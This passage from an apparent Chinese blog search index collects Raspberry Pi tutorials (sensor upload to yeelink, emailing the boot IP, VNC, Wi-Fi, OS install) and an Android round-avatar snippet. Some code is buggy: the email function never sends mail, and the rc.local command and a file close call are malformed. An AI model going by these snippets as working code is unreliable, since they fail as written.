<h5 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf8-*-</span></div><div class="line"><span class="comment">#打开你的DS18B20的数据文件</span></div><div class="line">tfile = open(<span class="string">"/sys/bus/w1/devices/28-0000075a0d1c/w1_slave"</span>)</div><div class="line"></div><div class="line"><span class="comment">#读取文件所有内容</span></div><div class="line">text = tfile.read()</div><div class="line"></div><div class="line"><span class="comment">#关闭文件</span></div><div class="line">tfile.close()</div><div class="line"></div><div class="line"><span class="comment">#用换行符分割字符串成数组，并取第二行</span></div><div class="line">secondline = text.split(<span class="string">"\n"</span>)[<span class="number">1</span>]</div><div class="line"></div><div class="line"><span class="comment">#用空格分割字符串成数组，并取最后一个，即t=18437</span></div><div class="line">temperaturedata = secondline.split(<span class="string">" "</span>)[<span class="number">9</span>]</div><div class="line"></div><div class="line"><span class="comment">#取t=后面的数值，并转换为浮点型</span></div><div class="line">temperature = float(temperaturedata[<span class="number">2</span>:])</div><div class="line"></div><div class="line"><span class="comment">#转换单位为摄氏度</span></div><div class="line">temperature = temperature / <span class="number">1000</span></div><div class="line"></div><div class="line"><span class="comment">#打印值</span></div><div class="line"><span class="keyword">print</span> temperature</div></pre></td></tr></table></figure>
<h5 id="执行python脚本读取温度"><a href="#执行python脚本读取温度" class="headerlink" title="执行python脚本读取温度"></a>执行python脚本读取温度</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python temp.py</span></div></pre></td></tr></table></figure>
<h4 id="上传数据到yeelink云端"><a href="#上传数据到yeelink云端" class="headerlink" title="上传数据到yeelink云端"></a>上传数据到yeelink云端</h4><p>　　yeelink 是一个开源的硬件数据平台，我喜欢把它定义为一个物联网云平台，因为它给我们提供了 API 接口，我们可以把数据发送到云平台保存起来，也可以随时查看，真的很棒。具体的操作可以查看博主的博客：<a href="http://fanzhenyu.me/2016/06/10/%E6%A0%91%E8%8E%93%E6%B4%BE-USB%E6%91%84%E5%83%8F%E5%A4%B4-yeelink%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7/" target="_blank" rel="external">树莓派+USB摄像头+yeelink实现云监控</a>。</p>
<h5 id="修改python代码"><a href="#修改python代码" class="headerlink" title="修改python代码"></a>修改python代码</h5><p>　　将温度值用 JSON 格式保存到一个文本文件（/home/pi/mytest/temper_data.txt），在转换单位为摄氏度后添加如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#数据转换成JSON格式</span></div><div class="line">res = <span class="string">'&#123;"value":%f&#125;'</span> %temperature</div><div class="line"></div><div class="line"><span class="comment">#打开文件</span></div><div class="line">output = open(<span class="string">'/home/pi/mytest/temper_data.txt'</span>, <span class="string">'w'</span>)</div><div class="line"></div><div class="line"><span class="comment">#写数据到文本文件中</span></div><div class="line">output.write(res)</div><div class="line"></div><div class="line"><span class="comment">#关闭文件</span></div><div class="line">output.close</div></pre></td></tr></table></figure>
<h5 id="新增yeelink-sh脚本"><a href="#新增yeelink-sh脚本" class="headerlink" title="新增yeelink.sh脚本"></a>新增yeelink.sh脚本</h5><p>　　在 /home/pi/mytest/ 目录下新建 yeelink.sh，写入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sudo python /home/pi/mytest/temp.py</div><div class="line">curl --request POST --data-binary @&quot;/home/pi/mytest/temper_data.txt&quot; --header &quot;U-ApiKey:XXXXXXXXXXXXXXXX&quot; http://api.yeelink.net/v1.0/device/设备号/sensor/传感器号/datapoints</div></pre></td></tr></table></figure>
<p>　　将 XXXXXXXXXXXXXXXX 替换为自已账户的 API Key，后面的 URL 也需要替换为自己申请的传感器 URL。</p>
<h5 id="为脚本增加可执行权限"><a href="#为脚本增加可执行权限" class="headerlink" title="为脚本增加可执行权限"></a>为脚本增加可执行权限</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">＄ sudo chmod +x yeelink.sh</div></pre></td></tr></table></figure>
<h5 id="将脚本加入cronjob定时任务"><a href="#将脚本加入cronjob定时任务" class="headerlink" title="将脚本加入cronjob定时任务"></a>将脚本加入cronjob定时任务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">＄ sudo crontab -e</div></pre></td></tr></table></figure>
<h5 id="让脚本自动运行"><a href="#让脚本自动运行" class="headerlink" title="让脚本自动运行"></a>让脚本自动运行</h5><p>　　加入下面一行, 让脚本每1分钟运行一次，即每1分钟上传一次温度数据，然后保存退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">*/1 * * * * /home/pi/mytest/yeelink.sh</div></pre></td></tr></table></figure>
<p>　　实验效果：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/30-4.jpg" alt="30-4"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>yeelink</tag>
        <tag>Raspberry Pi</tag>
        <tag>DS18B20</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派自动发送 ip 到指定邮箱</title>
    <url>/2016/05/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%20ip%20%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<p>　　知道树莓派的 ip 地址才能通过 SSH 或者 VNC 在你的电脑上操作树莓派，树莓派开机自动发送 ip 地址到指定邮箱会让你使用树莓派更加方便！</p>
<a id="more"></a>
<h4 id="新建一个python脚本文件"><a href="#新建一个python脚本文件" class="headerlink" title="新建一个python脚本文件"></a>新建一个python脚本文件</h4><p>　　输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> touch send_ip.py</span></div></pre></td></tr></table></figure>
<h4 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h4><p>（1）输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo vim send_ip.py</span></div></pre></td></tr></table></figure>
<p>（2）写入以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#!\usr\bin\env python</span></div><div class="line"><span class="comment">#-*-coding: utf-8-*-</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> smtplib</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</div><div class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</div><div class="line"><span class="keyword">from</span> email.mime.image <span class="keyword">import</span> MIMEImage</div><div class="line"></div><div class="line"><span class="comment">#发送邮件的基本函数，参数依次如下</span></div><div class="line"><span class="comment"># smtp服务器地址、邮箱用户名，邮箱秘密，发件人地址，手贱儿女地址（列表的方式），邮件主题，邮件html内容</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEmail</span><span class="params">(smtpserver,username,password,sender,receiver,subject,msghtml)</span>:</span></div><div class="line">        msgRoot =MIMEMultipart(<span class="string">'reklated'</span>)</div><div class="line">        msgRoot[<span class="string">'To'</span>]=<span class="string">','</span>.join(receiver)</div><div class="line">        msgRoot[<span class="string">'Subject'</span>]= subject</div><div class="line">        msgText = MIMEText(msghtml,<span class="string">'html'</span>,<span class="string">'utf-8'</span>)</div><div class="line">        msgRoot.attach(msgText)</div><div class="line">        smtp = smtplib.SMTP()</div><div class="line">        smtp.connect(smtpserver,<span class="string">"25"</span>)</div><div class="line">        smtp.login(username,password)</div><div class="line">        <span class="keyword">print</span> <span class="string">"YES"</span></div><div class="line">        smtp.quit()</div><div class="line"><span class="comment">#检查网络连通性</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_network</span><span class="params">()</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                result=urllib.urlopen(<span class="string">'http://baidu.com'</span>).read()</div><div class="line">                <span class="keyword">print</span> result</div><div class="line">                <span class="keyword">print</span> <span class="string">"Network is Ready!"</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">          <span class="keyword">except</span> Exception , e:</div><div class="line">                <span class="keyword">print</span> e</div><div class="line">                <span class="keyword">print</span> <span class="string">"Network is not ready,Sleep 5s..."</span></div><div class="line">                time.sleep(<span class="number">5</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="comment">#获取本级制定接口的ip地址</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip_address</span><span class="params">()</span>:</span></div><div class="line">        s =socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</div><div class="line">        s.connect((<span class="string">"1.1.1.1"</span>,<span class="number">80</span>))</div><div class="line">        ipaddr=s.getsockname()[<span class="number">0</span>]</div><div class="line">        s.close()</div><div class="line">        <span class="keyword">return</span> ipaddr</div><div class="line"></div><div class="line"><span class="keyword">if</span>  __name__ == <span class="string">'__main__'</span> :</div><div class="line">        check_network()</div><div class="line">        ipaddr= get_ip_address()</div><div class="line">        sendEmail(<span class="string">"smtp.sohu.com"</span>,<span class="string">'你的邮箱帐号'</span>,<span class="string">'你的邮箱密码'</span>,<span class="string">'发件人地址'</span>,[<span class="string">'收件人地址'</span>],<span class="string">'IP Address of Raspberry PI'</span>,ipaddr)</div></pre></td></tr></table></figure>
<p>（3）保存退出</p>
<p>　　vim 编辑器下保存退出步骤为：按 esc 然后输入 <code>：</code>，然后看到冒号显示出来再输入 <code>wq</code>，回车即可。</p>
<h4 id="设置开机自动执行该脚本"><a href="#设置开机自动执行该脚本" class="headerlink" title="设置开机自动执行该脚本"></a>设置开机自动执行该脚本</h4><p>　　在 /etc/rc.local 文件里加入下面这一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> /usr/bin/python/home/pi/send_ip.py</span></div></pre></td></tr></table></figure>
<p>　　输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/rc.local</span></div></pre></td></tr></table></figure>
<p>　　在文件中添加 <code>/usr/bin/python/home/pi/send_ip.py</code> 然后保存退出</p>
<p>　　特别提示：收到的邮件有可能在垃圾箱里，不要以为是脚本的问题，其实是邮箱的问题，请注意查看！另外，有的邮箱不支持 smtp，所以无法使用。搜狐和网易的邮箱亲测可用。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>ip</tag>
        <tag>Raspberry Pi</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派网线直连笔记本电脑</title>
    <url>/2016/05/23/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%BD%91%E7%BA%BF%E7%9B%B4%E8%BF%9E%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h4 id="查看网络连接状况"><a href="#查看网络连接状况" class="headerlink" title="查看网络连接状况"></a>查看网络连接状况</h4><p>　　运行 DOS 窗口，输入 <code>arp -a</code> ，可以看到没有连接树莓派时的网络连接情况。红色方框为笔记本连接无线网络的网络信息。</p>
<a id="more"></a>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/23-1.jpg" alt="23-1"></p>
<h4 id="连线"><a href="#连线" class="headerlink" title="连线"></a>连线</h4><p>　　树莓派接好供电线；将网线一端接到树莓派，另一端接到笔记本。</p>
<h4 id="共享无线网络"><a href="#共享无线网络" class="headerlink" title="共享无线网络"></a>共享无线网络</h4><p>　　如果现在笔记本已经通过WIFI连接到互联网，可以将无线网卡的互联网资源共享给本地连接。以 win7 系统为例，开始——控制面板——网络和Internet——网络和共享中心——查看网络状态和任务——更改适配器设置，找到无线网络连接右键“属性”，在共享选项卡上选中“允许其他网络用户通过此计算机的Internet连接来连接（N）”选项，下拉列表选择树莓派的那个网络，最后点确定。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/23-2.jpg" alt="23-2"></p>
<h4 id="查找树莓派的IP地址"><a href="#查找树莓派的IP地址" class="headerlink" title="查找树莓派的IP地址"></a>查找树莓派的IP地址</h4><p>　　运行 DOS 窗口，输入 <code>arp -a</code>，在这里可以看到在笔记本无线网络信息的上面（红色标注）多出来一个接口（蓝色标注），黄色标注的 ip 地址即为树莓派的 ip 地址。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/23-3.jpg" alt="23-3"></p>
<h4 id="利用Xshell或者PuTTY软件连接树莓派"><a href="#利用Xshell或者PuTTY软件连接树莓派" class="headerlink" title="利用Xshell或者PuTTY软件连接树莓派"></a>利用Xshell或者PuTTY软件连接树莓派</h4><p>　　通过树莓派的 ip 地址登录到树莓派，树莓派的默认账号为 pi，密码为 raspberry。登录后可以看到树莓派操作系统的命令行界面。</p>
<h4 id="图形化界面连接"><a href="#图形化界面连接" class="headerlink" title="图形化界面连接"></a>图形化界面连接</h4><p><strong>树莓派端：</strong></p>
<p>　　在命令行界面安装 VNC Server。</p>
<p>（1）安装VNC</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install tightvncserver</span></div></pre></td></tr></table></figure>
<p>（2）增加一个桌面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> tightvncserver</span></div></pre></td></tr></table></figure>
<p>（3）启动VNC服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> vncserver</span></div></pre></td></tr></table></figure>
<p>　　首次使用时需设置密码，当提示输入密码时，创建一个密码 (这个密码是远程用户访问时用的）</p>
<p>（4）关闭VNC服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> vncserver -<span class="built_in">kill</span></span></div></pre></td></tr></table></figure>
<p><strong>PC端：</strong></p>
<p>　　在 Windows 上下载安装下载 VNC viewer。地址<a href="http://www.tightvnc.com/download.php" target="_blank" rel="external">http://www.tightvnc.com/download.php：</a></p>
<p>（1）下载 Window 版的 VNC-Viewer ，无需安装，解压即可。 比如，解压出：VNC-Viewer-5.0.3-Windows-32bit.exe 。</p>
<p>（2）运行 VNC-Viewer 。</p>
<p>（3）输入树莓派的 ip 地址以及访问密码，即可登录到树莓派，并显示图形化界面。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/5/23-4.jpg" alt="23-4"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
        <tag>网络配置</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派配置无线网卡</title>
    <url>/2016/05/22/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/</url>
    <content><![CDATA[<h4 id="查看无线网卡状态"><a href="#查看无线网卡状态" class="headerlink" title="查看无线网卡状态"></a>查看无线网卡状态</h4><p>　　把无线网卡插到树莓派上，输入命令 ifconfig 查看是否有 wlan0 的信息，如果有说明网卡状态正常，可以直接进行第二步，直接配置无线网络。如果看不到 wlan0 的信息，则需要根据无线网卡型号安装驱动。</p>
<a id="more"></a>
<h4 id="修改interfaces文件"><a href="#修改interfaces文件" class="headerlink" title="修改interfaces文件"></a>修改interfaces文件</h4><p>（1）用编辑器 nano 打开 interfaces 文件。输入命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/network/interfaces</span></div></pre></td></tr></table></figure>
<p>（2）把该文件内容修改成如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">auto lo       </div><div class="line">iface lo inet loopback</div><div class="line">iface eth0 inet dhcp    #采用dhcp方式获取IP</div><div class="line"></div><div class="line">auto wlan0      #如果有wlan，无线网卡，则默认启动无线网卡连接</div><div class="line">allow-hotplug wlan0        #表示wlan设备可以热插拨</div><div class="line">iface wlan0 inet dhcp      #无线网卡连接也采用DHCP方式获取IP地址</div><div class="line">wpa-ssid &quot;你的wifi名字&quot;     #ssid名</div><div class="line">wpa-psk &quot;wifi密码&quot;         #wifi使用wpa-psk认证方式，认证密码</div><div class="line">iface default inet dhcp</div></pre></td></tr></table></figure>
<p>（3）保存，退出</p>
<h4 id="启用无线网"><a href="#启用无线网" class="headerlink" title="启用无线网"></a>启用无线网</h4><p>（1）用 <code>ifconfig</code> 命令可以看到 wlan0 设备，且有了IP地址(即表示已连接)。</p>
<p>（2）如果没有 IP 地址，则依次输入命令：<code>sudo ifdown wlan0</code> 和 <code>sudo ifup wlan0</code> 来启用 wlan0</p>
<p>（3）如果还不行，执行命令 <code>sudo reboot</code> 重启即可连上无线网络</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
        <tag>无线网卡</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装 Linux 操作系统</title>
    <url>/2016/05/18/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85%20Linux%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h4 id="树莓派上可安装的操作系统"><a href="#树莓派上可安装的操作系统" class="headerlink" title="树莓派上可安装的操作系统"></a>树莓派上可安装的操作系统</h4><p>（1）Linux：Raspbian，Arch Linux ARM</p>
<p>（2）Unix：FreeBSD，NetBSD</p>
<p>（3）Windows: Windows 10 for Raspberry Pi 2</p>
<a id="more"></a>
<p>其中：</p>
<ul>
<li><p>使用最广泛：Raspbian——基于Debian，为树莓派优化</p>
</li>
<li><p>强调定制性：Arch Linux ARM——为轻量，简洁，定制而生</p>
</li>
<li><p>Raspbmc——用Kodi（XBMC/Xbox Media Center）打造多媒体中心</p>
</li>
<li><p>Chromium OS——云端操作系统，中国大陆用户不方便使用</p>
</li>
<li><p>Windows 10 loT 物联网版本</p>
</li>
</ul>
<h4 id="Linux操作系统安装方法"><a href="#Linux操作系统安装方法" class="headerlink" title="Linux操作系统安装方法"></a>Linux操作系统安装方法</h4><h5 id="使用NOOBS来安装系统"><a href="#使用NOOBS来安装系统" class="headerlink" title="使用NOOBS来安装系统"></a>使用NOOBS来安装系统</h5><p>（1）将TF卡格式化为 FAT32 格式</p>
<p>注意：TF（micro SD）卡需要大于等于4GB，而且并不是所有 TF 卡都能兼容树莓派，需百度查询兼容性列表</p>
<p>（2） 到<a href="www.raspberrypi.org">树莓派官网</a>下载 NOOBS（进入主页后点击 DOWNLOAD 就可以看到 NOOBS 了）</p>
<p>（3）将 NOOBS 解压后的所有文件拷贝到TF卡的根目录下</p>
<p>（4）连接显示器，并给树莓派上电（5V，2A电源，也可直接使用电脑的USB插口）</p>
<p>（5）初始化完成以后，你会进入 NOOBS 助手界面</p>
<p>（6）选择你需要安装的操作系统，然后点击上方的 install OS 即可进入安装</p>
<p>（7）完成后点击确认，然后 Raspberry Pi 会重启，至此系统安装完成</p>
<h5 id="直接安装Linux系统到SD卡"><a href="#直接安装Linux系统到SD卡" class="headerlink" title="直接安装Linux系统到SD卡"></a>直接安装Linux系统到SD卡</h5><p>（1）到<a href="www.raspberrypi.org">树莓派官网</a>下载你需要的官方系统镜像</p>
<p>（2）下载安装镜像的工具 win32diskimager</p>
<p>（3）运行 Win32DiskImager，在软件中选择系统镜像（img文件），然后 device (设备）下选择 TF 卡盘符，<br>点击 write，等待写入完全，等到出现对话框 write successful 就说明成功了。</p>
<p>注意：写入完成后，win 系统下看到SD只有几十 MB 了，这是正常现象，因为 linux 下的分区 win 下是看不到的！  </p>
<p>（4）连接显示器，并给树莓派上电，至此系统安装完成</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Raspberry Pi</tag>
      </tags>
  </entry>
  <entry>
    <title>Android ImageView 实现圆形头像</title>
    <url>/2016/05/17/Android%20ImageView%20%E5%AE%9E%E7%8E%B0%E5%9C%86%E5%BD%A2%E5%A4%B4%E5%83%8F/</url>
    <content><![CDATA[<h4 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h4><p>　　先在 canvas 上面画一个圆形，参照圆形的起点坐标、半径，再画一个边长为圆的直径的 bitmap（这个bitmap 就是你想画的圆形头像），此时圆和 bitmap 重叠在一起，圆在下面，bitmap 在上面，bitmap 覆盖着圆。</p>
<a id="more"></a>
<p>　　这时，圆形和 bitmap 相交的部分正是圆大小的面积，如果能将 bitmap 与圆相交之外的部分去掉，那么我们看到的就是 bitmap 的圆形部分了。</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Bitmap <span class="title">toRoundBitmap</span><span class="params">(Bitmap bitmap)</span> </span>&#123;  </div><div class="line">    <span class="comment">//圆形图片宽高  </span></div><div class="line">    <span class="keyword">int</span> width = bitmap.getWidth();  </div><div class="line">    <span class="keyword">int</span> height = bitmap.getHeight();  </div><div class="line">    <span class="comment">//正方形的边长  </span></div><div class="line">    <span class="keyword">int</span> r = <span class="number">0</span>;  </div><div class="line">    <span class="comment">//取最短边做边长  </span></div><div class="line">    <span class="keyword">if</span>(width &amp;amp;amp;gt; height) &#123;  </div><div class="line">        r = height;  </div><div class="line">    &#125; <span class="keyword">else</span> &#123;  </div><div class="line">        r = width;  </div><div class="line">    &#125;  </div><div class="line">    <span class="comment">//构建一个bitmap  </span></div><div class="line">    Bitmap backgroundBmp = Bitmap.createBitmap(width,  </div><div class="line">             height, Config.ARGB_8888);  </div><div class="line">    <span class="comment">//new一个Canvas，在backgroundBmp上画图  </span></div><div class="line">    Canvas canvas = <span class="keyword">new</span> Canvas(backgroundBmp);  </div><div class="line">    Paint paint = <span class="keyword">new</span> Paint();  </div><div class="line">    <span class="comment">//设置边缘光滑，去掉锯齿  </span></div><div class="line">    paint.setAntiAlias(<span class="keyword">true</span>);  </div><div class="line">    <span class="comment">//宽高相等，即正方形  </span></div><div class="line">    RectF rect = <span class="keyword">new</span> RectF(<span class="number">0</span>, <span class="number">0</span>, r, r);  </div><div class="line">    <span class="comment">//通过制定的rect画一个圆角矩形，当圆角X轴方向的半径等于Y轴方向的半径时，  </span></div><div class="line">    <span class="comment">//且都等于r/2时，画出来的圆角矩形就是圆形  </span></div><div class="line">    canvas.drawRoundRect(rect, r/<span class="number">2</span>, r/<span class="number">2</span>, paint);  </div><div class="line">    <span class="comment">//设置当两个图形相交时的模式，SRC_IN为取SRC图形相交的部分，多余的将被去掉  </span></div><div class="line">    paint.setXfermode(<span class="keyword">new</span> PorterDuffXfermode(Mode.SRC_IN));  </div><div class="line">    <span class="comment">//canvas将bitmap画在backgroundBmp上  </span></div><div class="line">    canvas.drawBitmap(bitmap, <span class="keyword">null</span>, rect, paint);  </div><div class="line">    <span class="comment">//返回已经绘画好的backgroundBmp  </span></div><div class="line">    <span class="keyword">return</span> backgroundBmp;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="使用详解"><a href="#使用详解" class="headerlink" title="使用详解"></a>使用详解</h4><h5 id="drawable文件夹获取图片资源进行转换"><a href="#drawable文件夹获取图片资源进行转换" class="headerlink" title="drawable文件夹获取图片资源进行转换"></a>drawable文件夹获取图片资源进行转换</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 以数据流的方式读取bitmap资源</span></div><div class="line">Resources r = <span class="keyword">this</span>.getResources();</div><div class="line">InputStream is = r.openRawResource(R.drawable.iv_head);</div><div class="line">BitmapDrawable bmpDraw = <span class="keyword">new</span> BitmapDrawable(is);</div><div class="line">Bitmap bmp = bmpDraw.getBitmap();</div><div class="line"> </div><div class="line"><span class="comment">// 将图片转换成圆形图片</span></div><div class="line">Bitmap bm = toRoundBitmap(bmp);</div><div class="line"> </div><div class="line"><span class="comment">//传给imagview进行显示</span></div><div class="line">imageview.setImageBitmap(bm);</div></pre></td></tr></table></figure>
<h5 id="sdcard中获取图片资源进行转换"><a href="#sdcard中获取图片资源进行转换" class="headerlink" title="sdcard中获取图片资源进行转换"></a>sdcard中获取图片资源进行转换</h5><p>　　注意：需添加 sdcard 读取数据的权限</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Bitmap bmp = BitmapFactory.decodeFile(path) (path 是图片的路径，根目录是/sdcard)</div><div class="line"> </div><div class="line"><span class="comment">// 将图片转换成圆形图片</span></div><div class="line">Bitmap bm = toRoundBitmap(bmp);</div><div class="line"> </div><div class="line"><span class="comment">//传给imagview进行显示</span></div><div class="line">imageview.setImageBitmap(bm);</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>ImageView</tag>
      </tags>
  </entry>
</search>
